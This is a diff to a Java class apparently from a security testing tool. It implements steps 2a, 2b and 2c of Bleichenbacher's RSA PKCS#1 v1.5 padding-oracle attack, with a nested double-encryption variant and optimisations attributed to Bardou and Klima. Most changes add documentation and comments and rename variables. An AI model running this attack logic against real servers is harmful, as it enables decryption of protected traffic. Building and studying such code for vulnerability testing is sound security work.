@@ -20,7 +20,6 @@ import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
-import java.util.concurrent.*;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -91,6 +90,8 @@ public class Bleichenbacher extends Pkcs1Attack {
      * Searches the smallest suitable s-value for the inner encryption of a nested (double
      * encrypted) BB-Attack.
      *
+     * <p>Implements Step 2b without parallel threats
+     *
      * @param lowerBound The smallest value where it makes sens to start searching
      * @param ciphertext the ciphertext which should be checked against
      * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
@@ -143,21 +144,30 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    /**
+     * Generates the state for the Bleichenbacher attack Step 2B with single Calls to 2C.
+     *
+     * @param M The intervals as mentioned in the Bleichenbacher paper.
+     * @param previousS The previous value of 's' used in the attack.
+     * @param rsaPublicKey The RSA public key used in the attack.
+     * @return The state as an ArrayList of arrays of BigIntegers.
+     */
     private ArrayList<BigInteger[]> genState(
             List<Interval> M, BigInteger previousS, CustomRsaPublicKey rsaPublicKey) {
 
-        // Arrayliste aus einem array Bigintegers
-
+        // Saving s and r in States
         ArrayList<BigInteger[]> state = new ArrayList<>();
 
-        // für jedes M
-        for (Interval interval : M) {
-            BigInteger upperBound = interval.getUpper();
+        for (Interval chosenInterval : M) {
+            BigInteger upperBound = chosenInterval.getUpper();
             BigInteger bTimesPrevS = upperBound.multiply(previousS);
             BigInteger bTimePrevsSubTwoB = bTimesPrevS.subtract(two_B);
+            // r = ceil(2 * b * (s-1) - 2B, n)
             BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
 
             BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
+
+            // s = ceil(2B + r*n, b)
             BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
             state.add(new BigInteger[] {si_lower, ri});
         }
@@ -165,6 +175,17 @@ public class Bleichenbacher extends Pkcs1Attack {
         return state;
     }
 
+    /**
+     * Searches the smallest suitable s-value for the inner encryption of a nested (double
+     * encrypted) BB-Attack.
+     *
+     * <p>Implements Step 2b parallel threats improvement from klima
+     *
+     * @param ciphertext the ciphertext which should be checked against
+     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
+     * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
+     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
+     */
     private BigInteger step2b(
             List<Interval> M,
             BigInteger previousS,
@@ -175,27 +196,31 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         LOGGER.info("the array has {} items", M.size());
 
-        ArrayList<BigInteger[]> states = new ArrayList<>();
+        ArrayList<BigInteger[]> states;
         states = genState(M, previousS, rsaPublicKey);
 
         while (true) {
-            // für jedes M nach index
             for (int i = 0; i < M.size(); i++) {
-                LOGGER.info("running in {}", i);
-                BigInteger a = M.get(i).lower;
-                BigInteger b = M.get(i).upper;
+                BigInteger lower = M.get(i).lower;
+                BigInteger upper = M.get(i).upper;
+
+                // reading saved values from state
                 BigInteger currentS = states.get(i)[0];
                 BigInteger r = states.get(i)[1];
+
+                // running a single 2c step and get result as array
                 BigInteger[] results =
-                        step2cSingle(a, b, currentS, r, ciphertext, rsaPublicKey, outerKey);
+                        step2cSingle(lower, upper, currentS, r, ciphertext, rsaPublicKey, outerKey);
 
                 BigInteger success = results[0];
                 currentS = results[1];
                 r = results[2];
 
                 if (success.compareTo(BigInteger.ONE) == 0) {
+                    // return s because of correct s value
                     return currentS;
                 } else {
+                    // Save back state
                     states.get(i)[0] = currentS;
                     states.get(i)[1] = r;
                 }
@@ -224,6 +249,7 @@ public class Bleichenbacher extends Pkcs1Attack {
             if (s.compareTo(low) >= 0 && s.compareTo(high) <= 0) {
                 s = high.add(BigInteger.ONE);
             } else if (low.compareTo(high) > 0) {
+                LOGGER.info("thats it - no more holes");
                 return new BigInteger[] {s, BigInteger.ZERO, BigInteger.ZERO, BigInteger.ZERO};
             } else if (s.compareTo(low) < 0) {
                 return new BigInteger[] {s, j, high, low};
@@ -237,9 +263,22 @@ public class Bleichenbacher extends Pkcs1Attack {
                                                     .multiply(publicKey.getModulus()))),
                                     M.upper)
                             .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
+
+            LOGGER.info("Skipping {} Values", high.subtract(low).intValue());
         }
     }
 
+    /**
+     * Perform the step 2a of the Bleichenbacher Attack inkl. Skipping holes and Trimming
+     * improvements from Bardou.
+     *
+     * @param lowerBound the lower bound value
+     * @param ciphertext the ciphertext to manipulate
+     * @param rsaPublicKey the RSA public key
+     * @param outerKey the outer key
+     * @param M the list of intervals
+     * @return the final result of step 2a
+     */
     private BigInteger step2a(
             BigInteger lowerBound,
             byte[] ciphertext,
@@ -251,17 +290,16 @@ public class Bleichenbacher extends Pkcs1Attack {
         boolean oracleResult;
 
         BigInteger j = BigInteger.ONE;
-        BigInteger low =
-                ceil(
-                        three_B.add(j.multiply(rsaPublicKey.getModulus())),
-                        M.get(0).lower); // ceil(3*B+j*n,a)
+        // ceil(3*B+j*n,a)
+        BigInteger low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);
+
+        // ceil(2*B+(j+1)*n,b)-1
         BigInteger high =
                 ceil(
-                                two_B.add(
-                                        (j.add(BigInteger.ONE)
-                                                .multiply(rsaPublicKey.getModulus()))),
-                                M.get(0).upper)
-                        .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
+                        two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
+                        M.get(0).upper);
+
+        high = high.subtract(BigInteger.ONE);
 
         while (true) {
 
@@ -309,6 +347,17 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    /**
+     * Searches for a valid s-value as part of the paralle threats method from klima, pretending only
+     * one interval was found to search for the next s-value
+     *
+     * @param lowerBound the lower bound for the possible s-values
+     * @param upperBound the upper boud for the possible s-values
+     * @param ciphertext the ciphertext, for which the s-values should be found
+     * @param rsaPublicKey the public-key for which the s-values should be found
+     * @param outerKey the outer encryption key
+     * @return
+     */
     private BigInteger[] step2cSingle(
             BigInteger lowerBound,
             BigInteger upperBound,
